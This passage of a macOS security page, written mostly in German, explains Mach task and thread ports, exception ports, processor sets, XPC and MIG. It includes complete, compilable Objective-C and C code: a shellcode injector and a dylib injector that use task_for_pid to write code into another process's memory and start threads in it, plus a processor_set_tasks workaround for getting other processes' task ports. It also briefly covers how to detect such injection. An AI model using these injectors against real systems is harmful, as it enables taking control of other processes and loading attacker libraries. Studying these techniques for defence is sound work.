* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: Der Bootstrap-Port der Aufgabe. Wird verwendet, um Nachrichten zu senden, die die Rückgabe anderer Systemdienstports anfordern.
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: Der Port, der verwendet wird, um Informationen über den enthaltenen Host anzufordern. Dies ist der Port, der von **mach\_host\_self** zurückgegeben wird.
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: Der Port, der die Quelle benennt, aus der diese Aufgabe ihren verkabelten Kernel-Speicher bezieht.
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: Der Port, der die Quelle benennt, aus der diese Aufgabe ihren standardmäßig verwalteten Speicher bezieht.

### Task Ports

Ursprünglich hatte Mach keine "Prozesse", sondern "Aufgaben", die eher als Container von Threads betrachtet wurden. Als Mach mit BSD zusammengeführt wurde, **wurde jede Aufgabe mit einem BSD-Prozess korreliert**. Daher hat jeder BSD-Prozess die Details, die er benötigt, um ein Prozess zu sein, und jede Mach-Aufgabe hat auch ihre inneren Abläufe (außer für die nicht existierende pid 0, die die `kernel_task` ist).

Es gibt zwei sehr interessante Funktionen, die damit zusammenhängen:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Erhalte ein SEND-Recht für den Task-Port der Aufgabe, die mit dem durch die `pid` angegebenen verbunden ist, und gib es an den angegebenen `target_task_port` weiter (der normalerweise die aufrufende Aufgabe ist, die `mach_task_self()` verwendet hat, aber auch ein SEND-Port über eine andere Aufgabe sein könnte).
* `pid_for_task(task, &pid)`: Gegeben ein SEND-Recht für eine Aufgabe, finde heraus, zu welcher PID diese Aufgabe gehört.

Um Aktionen innerhalb der Aufgabe auszuführen, benötigte die Aufgabe ein `SEND`-Recht für sich selbst, indem sie `mach_task_self()` aufruft (was den `task_self_trap` (28) verwendet). Mit dieser Berechtigung kann eine Aufgabe mehrere Aktionen ausführen, wie:

* `task_threads`: Erhalte SEND-Recht über alle Task-Ports der Threads der Aufgabe
* `task_info`: Erhalte Informationen über eine Aufgabe
* `task_suspend/resume`: Unterbreche oder setze eine Aufgabe fort
* `task_[get/set]_special_port`
* `thread_create`: Erstelle einen Thread
* `task_[get/set]_state`: Steuere den Zustand der Aufgabe
* und mehr kann in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) gefunden werden

{% hint style="danger" %}
Beachte, dass es mit einem SEND-Recht über einen Task-Port einer **anderen Aufgabe** möglich ist, solche Aktionen über eine andere Aufgabe auszuführen.
{% endhint %}

Darüber hinaus ist der task\_port auch der **`vm_map`**-Port, der es ermöglicht, **Speicher innerhalb einer Aufgabe zu lesen und zu manipulieren** mit Funktionen wie `vm_read()` und `vm_write()`. Das bedeutet im Wesentlichen, dass eine Aufgabe mit SEND-Rechten über den task\_port einer anderen Aufgabe in der Lage sein wird, **Code in diese Aufgabe zu injizieren**.

Denke daran, dass, weil der **Kernel auch eine Aufgabe ist**, wenn es jemandem gelingt, **SEND-Berechtigungen** über die **`kernel_task`** zu erhalten, er in der Lage sein wird, den Kernel alles ausführen zu lassen (Jailbreaks).

* Rufe `mach_task_self()` auf, um **den Namen** für diesen Port für die aufrufende Aufgabe zu erhalten. Dieser Port wird nur **vererbt** über **`exec()`**; eine neue Aufgabe, die mit `fork()` erstellt wird, erhält einen neuen Task-Port (als Sonderfall erhält eine Aufgabe auch einen neuen Task-Port nach `exec()` in einem suid-Binary). Der einzige Weg, eine Aufgabe zu starten und ihren Port zu erhalten, besteht darin, den ["Port-Swap-Tanz"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) während eines `fork()` auszuführen.
* Dies sind die Einschränkungen für den Zugriff auf den Port (aus `macos_task_policy` aus dem Binary `AppleMobileFileIntegrity`):
* Wenn die App die **`com.apple.security.get-task-allow`-Berechtigung** hat, können Prozesse vom **gleichen Benutzer auf den Task-Port** zugreifen (häufig von Xcode zum Debuggen hinzugefügt). Der **Notarisierungs**-Prozess erlaubt dies nicht für Produktionsversionen.
* Apps mit der **`com.apple.system-task-ports`**-Berechtigung können den **Task-Port für jeden** Prozess erhalten, außer für den Kernel. In älteren Versionen wurde es **`task_for_pid-allow`** genannt. Dies wird nur Apple-Anwendungen gewährt.
* **Root kann auf Task-Ports** von Anwendungen **nicht** zugreifen, die mit einer **hardened** Runtime (und nicht von Apple) kompiliert wurden.

**Der Task-Name-Port:** Eine unprivilegierte Version des _Task-Ports_. Er verweist auf die Aufgabe, erlaubt jedoch keine Kontrolle darüber. Das einzige, was anscheinend darüber verfügbar ist, ist `task_info()`.

### Thread Ports

Threads haben ebenfalls zugeordnete Ports, die von der Aufgabe, die **`task_threads`** aufruft, und vom Prozessor mit `processor_set_threads` sichtbar sind. Ein SEND-Recht auf den Thread-Port ermöglicht die Verwendung der Funktionen aus dem `thread_act`-Subsystem, wie:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Jeder Thread kann diesen Port aufrufen, indem er **`mach_thread_sef`** aufruft.

### Shellcode-Injektion in einen Thread über den Task-Port

Du kannst einen Shellcode von:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kompilieren** Sie das vorherige Programm und fügen Sie die **Berechtigungen** hinzu, um Code mit demselben Benutzer injizieren zu können (ansonsten müssen Sie **sudo** verwenden).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Um dies auf iOS zum Laufen zu bringen, benötigen Sie die Berechtigung `dynamic-codesigning`, um einen beschreibbaren Speicher ausführbar zu machen.
{% endhint %}

### Dylib-Injektion in den Thread über den Task-Port

In macOS können **Threads** über **Mach** oder die **posix `pthread` API** manipuliert werden. Der Thread, den wir in der vorherigen Injektion erzeugt haben, wurde mit der Mach-API erstellt, daher ist er **nicht posix-konform**.

Es war möglich, **einen einfachen Shellcode** zu injizieren, um einen Befehl auszuführen, da er **nicht mit posix** konformen APIs arbeiten musste, sondern nur mit Mach. **Komplexere Injektionen** würden erfordern, dass der **Thread** ebenfalls **posix-konform** ist.

Um den **Thread zu verbessern**, sollte er **`pthread_create_from_mach_thread`** aufrufen, was **einen gültigen pthread** erstellt. Dann könnte dieser neue pthread **dlopen** aufrufen, um eine **dylib** aus dem System zu laden, sodass anstelle von neuem Shellcode, um verschiedene Aktionen auszuführen, benutzerdefinierte Bibliotheken geladen werden können.

Sie finden **Beispiel-dylibs** in (zum Beispiel die, die ein Protokoll generiert und dann können Sie es abhören):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In dieser Technik wird ein Thread des Prozesses übernommen:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Task Port Injection Detection

Beim Aufruf von `task_for_pid` oder `thread_create_*` wird ein Zähler in der Struktur task aus dem Kernel erhöht, der im Benutzermodus durch den Aufruf von task\_info(task, TASK\_EXTMOD\_INFO, ...) abgerufen werden kann.

## Exception Ports

Wenn eine Ausnahme in einem Thread auftritt, wird diese Ausnahme an den vorgesehenen Ausnahmeport des Threads gesendet. Wenn der Thread sie nicht behandelt, wird sie an die Ausnahmeports des Tasks gesendet. Wenn der Task sie nicht behandelt, wird sie an den Hostport gesendet, der von launchd verwaltet wird (wo sie anerkannt wird). Dies wird als Ausnahme-Triage bezeichnet.

Beachten Sie, dass am Ende, wenn sie nicht ordnungsgemäß behandelt wird, der Bericht normalerweise vom ReportCrash-Daemon behandelt wird. Es ist jedoch möglich, dass ein anderer Thread im selben Task die Ausnahme verwaltet, was Tools zur Absturzberichterstattung wie `PLCreashReporter` tun.

## Other Objects

### Clock

Jeder Benutzer kann Informationen über die Uhr abrufen, jedoch muss man, um die Zeit einzustellen oder andere Einstellungen zu ändern, Root-Rechte haben.

Um Informationen zu erhalten, ist es möglich, Funktionen aus dem `clock`-Subsystem wie `clock_get_time`, `clock_get_attributtes` oder `clock_alarm` aufzurufen.\
Um Werte zu ändern, kann das `clock_priv`-Subsystem mit Funktionen wie `clock_set_time` und `clock_set_attributes` verwendet werden.

### Processors and Processor Set

Die Prozessor-APIs ermöglichen die Steuerung eines einzelnen logischen Prozessors durch den Aufruf von Funktionen wie `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Darüber hinaus bietet die **Processor Set**-API eine Möglichkeit, mehrere Prozessoren in einer Gruppe zu gruppieren. Es ist möglich, das Standard-Prozessor-Set durch den Aufruf von **`processor_set_default`** abzurufen.\
Dies sind einige interessante APIs, um mit dem Prozessor-Set zu interagieren:

* `processor_set_statistics`
* `processor_set_tasks`: Gibt ein Array von Senderechten an alle Tasks im Prozessor-Set zurück
* `processor_set_threads`: Gibt ein Array von Senderechten an alle Threads im Prozessor-Set zurück
* `processor_set_stack_usage`
* `processor_set_info`

Wie in [**diesem Beitrag**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/) erwähnt, ermöglichte dies in der Vergangenheit, den zuvor genannten Schutz zu umgehen, um Task-Ports in anderen Prozessen zu erhalten, um sie durch den Aufruf von **`processor_set_tasks`** zu steuern und einen Hostport für jeden Prozess zu erhalten.\
Heutzutage benötigen Sie Root-Rechte, um diese Funktion zu verwenden, und dies ist geschützt, sodass Sie diese Ports nur in ungeschützten Prozessen erhalten können.

Sie können es mit folgendem versuchen:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
